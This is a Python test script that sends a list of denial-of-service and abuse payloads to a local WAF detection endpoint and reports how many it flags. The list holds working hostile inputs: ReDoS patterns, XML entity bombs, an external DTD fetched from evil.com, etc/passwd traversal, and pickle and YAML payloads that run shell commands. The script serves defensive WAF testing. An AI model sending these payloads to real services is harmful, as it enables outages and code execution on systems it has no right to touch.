#!/usr/bin/env python3
"""
DoS/DDoS Attack Pattern Test Suite
Tests denial of service patterns and resource exhaustion attacks against the WAF
NOTE: This script tests attack PATTERNS, not actual DoS attacks
"""

import requests
import json
import time
from typing import Dict

WAF_API = "http://localhost:3001/api/waf/check"

# DoS/DDoS Attack Patterns
DOS_ATTACKS = [
    # ReDoS (Regular Expression Denial of Service)
    {
        "name": "ReDoS exponential",
        "path": "/api/regex",
        "body": {"pattern": "^(a+)+$", "input": "a" * 30 + "!"},
    },
    {
        "name": "ReDoS nested groups",
        "path": "/api/validate",
        "body": {"regex": "^(a|a)+$", "data": "a" * 25},
    },
    {
        "name": "ReDoS catastrophic",
        "path": "/api/match",
        "body": {"expr": "^([a-zA-Z]+)*$", "text": "a" * 30 + "1"},
    },
    {
        "name": "ReDoS email pattern",
        "path": "/api/email",
        "query": {"email": "a" * 50 + "@" + "a" * 50},
    },
    {
        "name": "ReDoS URL pattern",
        "path": "/api/url",
        "query": {"url": "http://" + "a" * 100 + "." * 50},
    },
    # XML Bomb / Billion Laughs
    {
        "name": "XML bomb lol1",
        "path": "/api/xml",
        "body": '<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><lolz>&lol2;</lolz>',
    },
    {
        "name": "XML bomb nested",
        "path": "/api/parse",
        "body": '<!DOCTYPE r [<!ENTITY a "a"><!ENTITY b "&a;&a;&a;"><!ENTITY c "&b;&b;&b;">]><r>&c;</r>',
    },
    {
        "name": "XML quadratic blowup",
        "path": "/api/xml/expand",
        "body": '<!DOCTYPE r [<!ENTITY x "'
        + "X" * 10000
        + '">]><r>'
        + "&x;" * 100
        + "</r>",
    },
    {
        "name": "XML external subset",
        "path": "/api/xml/load",
        "body": '<!DOCTYPE r SYSTEM "http://evil.com/huge.dtd"><r/>',
    },
    # JSON Bomb
    {
        "name": "JSON deeply nested",
        "path": "/api/json",
        "body": '{"a":' * 100 + "1" + "}" * 100,
    },
    {
        "name": "JSON array bomb",
        "path": "/api/data",
        "body": {"data": [[[[[[[[[[1]]]]]]]]]]},
    },
    {"name": "JSON huge keys", "path": "/api/config", "body": {("a" * 10000): "value"}},
    {
        "name": "JSON many keys",
        "path": "/api/object",
        "body": {f"key{i}": i for i in range(1000)},
    },
    # Hash Collision DoS
    {
        "name": "Hash collision keys",
        "path": "/api/hash",
        "body": {"AaAaAaAa": 1, "AaAaAaBB": 2, "AaAaBBAa": 3, "AaAaBBBB": 4},
    },
    {
        "name": "Hash collision params",
        "path": "/api/form",
        "query": {f"AaAa{i}": i for i in range(100)},
    },
    # Compression Bomb (Zip Bomb patterns)
    {
        "name": "Gzip bomb header",
        "path": "/api/upload",
        "headers": {"Content-Encoding": "gzip"},
        "body": "H4sIAAAAAAAA" + "A" * 1000,
    },
    {
        "name": "Deflate bomb",
        "path": "/api/decompress",
        "headers": {"Content-Encoding": "deflate"},
        "body": "eJzLSM3JyQcABiwCFQ==",
    },
    # Slowloris Patterns
    {
        "name": "Slow headers incomplete",
        "path": "/api/slow",
        "headers": {"X-Custom": "incomplete..."},
    },
    {
        "name": "Slow body transfer",
        "path": "/api/upload",
        "headers": {"Content-Length": "1000000", "Transfer-Encoding": "chunked"},
    },
    {
        "name": "Keep-alive abuse",
        "path": "/api/persistent",
        "headers": {"Connection": "keep-alive", "Keep-Alive": "timeout=999999"},
    },
    # Resource Exhaustion Patterns
    {
        "name": "Large header value",
        "path": "/api/header",
        "headers": {"X-Large": "A" * 8000},
    },
    {
        "name": "Many headers",
        "path": "/api/headers",
        "headers": {f"X-Header-{i}": f"value{i}" for i in range(100)},
    },
    {
        "name": "Large query string",
        "path": "/api/query?" + "&".join([f"p{i}=v{i}" for i in range(500)]),
        "query": {},
    },
    {"name": "Large POST body", "path": "/api/post", "body": "x" * 10000000},
    {"name": "Large URL path", "path": "/api/" + "a/" * 200, "query": {}},
    {"name": "Unicode expansion", "path": "/api/unicode", "body": "\ufeff" * 10000},
    # Cache Poisoning DoS
    {
        "name": "Cache key pollution",
        "path": "/api/cache",
        "query": {"_cb": "random" * 100},
    },
    {
        "name": "Cache storage exhaust",
        "path": "/api/static/file" + "x" * 1000 + ".js",
        "query": {},
    },
    {
        "name": "Vary header abuse",
        "path": "/api/cached",
        "headers": {"Accept-Language": "x" * 100},
    },
    # Memory Exhaustion Patterns
    {
        "name": "Recursive JSON",
        "path": "/api/recursive",
        "body": {"a": {"a": {"a": {"a": {"a": {"a": {"a": 1}}}}}}},
    },
    {
        "name": "Array length abuse",
        "path": "/api/array",
        "body": {"items": list(range(100000))},
    },
    {
        "name": "String allocation",
        "path": "/api/string",
        "body": {"data": "x" * 1000000},
    },
    {
        "name": "Multipart many parts",
        "path": "/api/multipart",
        "headers": {"Content-Type": "multipart/form-data; boundary=----"},
    },
    # CPU Exhaustion Patterns
    {
        "name": "Complex regex",
        "path": "/api/search",
        "query": {"pattern": "(?:(?:(?:(?:(?:(?:(?:(?:a)*)*)*)*)*)*)*)"},
    },
    {
        "name": "Sort complexity",
        "path": "/api/sort",
        "body": {"array": list(range(10000, 0, -1))},
    },
    {
        "name": "Math computation",
        "path": "/api/calculate",
        "body": {"expr": "9" * 1000 + "**" + "9" * 100},
    },
    {
        "name": "Date parsing",
        "path": "/api/date",
        "query": {"date": "9" * 100 + "-01-01"},
    },
    # File System DoS
    {
        "name": "Path length abuse",
        "path": "/api/file",
        "query": {"path": "/" + "a" * 255 + "/" * 20},
    },
    {
        "name": "Symlink loop",
        "path": "/api/read",
        "query": {"file": "../../" * 100 + "etc/passwd"},
    },
    {
        "name": "Null byte DoS",
        "path": "/api/open",
        "query": {"name": "\x00" * 1000 + "file.txt"},
    },
    {"name": "Special chars", "path": "/api/path", "query": {"dir": "..." * 1000}},
    # Network DoS Patterns
    {
        "name": "IPv6 expansion",
        "path": "/api/connect",
        "query": {"host": "::ffff:" + "0:" * 100},
    },
    {
        "name": "DNS amplification pattern",
        "path": "/api/lookup",
        "query": {"domain": "a" * 63 + "." + "a" * 63 + ".com"},
    },
    {
        "name": "SSRF amplification",
        "path": "/api/fetch",
        "query": {"url": "http://localhost:80/../" * 100},
    },
    # Websocket DoS Patterns
    {
        "name": "WS frame flood",
        "path": "/ws",
        "headers": {"Upgrade": "websocket", "Sec-WebSocket-Version": "13"},
    },
    {
        "name": "WS large message",
        "path": "/ws/message",
        "body": {"data": "x" * 1000000},
    },
    {"name": "WS ping flood", "path": "/ws/ping", "body": {"ping": True}},
    # API Rate Abuse Patterns
    {
        "name": "Rapid fire requests",
        "path": "/api/rapid",
        "headers": {"X-Request-ID": "burst-" + str(time.time())},
    },
    {
        "name": "Credential stuffing",
        "path": "/api/login",
        "body": {"user": "admin", "pass": "password123"},
    },
    {
        "name": "Password spray",
        "path": "/api/auth",
        "body": {"username": "user1", "password": "Summer2024!"},
    },
    {
        "name": "Account enumeration",
        "path": "/api/forgot",
        "body": {"email": "admin@company.com"},
    },
    # GraphQL DoS
    {
        "name": "GraphQL deep query",
        "path": "/api/graphql",
        "body": {"query": "{a{b{c{d{e{f{g{h{i{j}}}}}}}}}}"},
    },
    {
        "name": "GraphQL batch abuse",
        "path": "/api/graphql",
        "body": [{"query": "{user{id}}"} for _ in range(1000)],
    },
    {
        "name": "GraphQL alias bomb",
        "path": "/api/graphql",
        "body": {
            "query": "{" + " ".join([f"a{i}:user{{id}}" for i in range(100)]) + "}"
        },
    },
    {
        "name": "GraphQL introspection",
        "path": "/api/graphql",
        "body": {"query": "{__schema{types{name fields{name}}}}"},
    },
    # Serialization DoS
    {
        "name": "PHP serialization",
        "path": "/api/unserialize",
        "body": 'O:8:"stdClass":' + "999999" + ":{}",
    },
    {
        "name": "Java deserialization",
        "path": "/api/java",
        "body": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==",
    },
    {
        "name": "Pickle bomb",
        "path": "/api/pickle",
        "body": {
            "data": "gASVKAAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwNb3MucG9wZW4oJ2lkJymUhZRSlC4="
        },
    },
    {
        "name": "YAML bomb",
        "path": "/api/yaml",
        "body": "!!python/object/apply:os.system ['sleep 10']",
    },
    # Hidden in legitimate requests
    {
        "name": "Search query bomb",
        "path": "/api/search",
        "query": {"q": "(" * 500 + "term" + ")" * 500},
    },
    {
        "name": "File upload bomb",
        "path": "/api/upload",
        "body": {"filename": "a" * 500 + ".jpg", "content": "x" * 1000000},
    },
    {
        "name": "Report generation",
        "path": "/api/report",
        "body": {"rows": 999999, "columns": 100, "format": "pdf"},
    },
]


def test_payload(attack: Dict) -> Dict:
    """Test a single DoS pattern against WAF"""
    payload = {
        "method": "POST" if "body" in attack else "GET",
        "path": attack["path"],
        "query_params": attack.get("query", {}),
        "headers": {
            "User-Agent": "Mozilla/5.0 (compatible; DoS-Test/1.0)",
            "Accept": "*/*",
            "Content-Type": "application/json",
            **(attack.get("headers", {})),
        },
    }

    body = attack.get("body")
    if body:
        if isinstance(body, (dict, list)):
            try:
                payload["body"] = json.dumps(body)
            except (TypeError, ValueError):
                payload["body"] = str(body)
        else:
            payload["body"] = str(body)

    try:
        response = requests.post(WAF_API, json=payload, timeout=10)
        result = response.json()
        return {
            "name": attack["name"],
            "detected": result.get("is_anomaly", False),
            "score": result.get("anomaly_score", 0),
            "time_ms": result.get("processing_time_ms", 0),
        }
    except Exception as e:
        return {"name": attack["name"], "error": str(e)}


def main():
    print("=" * 70)
    print("DoS/DDoS ATTACK PATTERN TEST SUITE")
    print("=" * 70)
    print(f"Testing {len(DOS_ATTACKS)} DoS/DDoS patterns...\n")
    print("NOTE: This tests attack PATTERNS, not actual DoS attacks\n")

    detected = 0
    missed = 0
    errors = 0

    for i, attack in enumerate(DOS_ATTACKS, 1):
        result = test_payload(attack)

        if "error" in result:
            status = "\033[93m[ERROR]\033[0m"
            errors += 1
        elif result["detected"]:
            status = "\033[92m[BLOCKED]\033[0m"
            detected += 1
        else:
            status = "\033[91m[MISSED]\033[0m"
            missed += 1

        score = result.get("score", 0)
        print(
            f"[{i:02d}/{len(DOS_ATTACKS)}] {status} {result['name'][:40]:<40} Score: {score:.4f}"
        )
        time.sleep(0.05)

    print("\n" + "=" * 70)
    print("SUMMARY")
    print("=" * 70)
    print(f"Total Tests:  {len(DOS_ATTACKS)}")
    print(f"\033[92mBlocked:      {detected}\033[0m")
    print(f"\033[91mMissed:       {missed}\033[0m")
    print(f"\033[93mErrors:       {errors}\033[0m")
    detection_rate = (
        detected / (len(DOS_ATTACKS) - errors) * 100
        if (len(DOS_ATTACKS) - errors) > 0
        else 0
    )
    print(f"Detection Rate: {detection_rate:.1f}%")
    print("=" * 70)


if __name__ == "__main__":
    main()
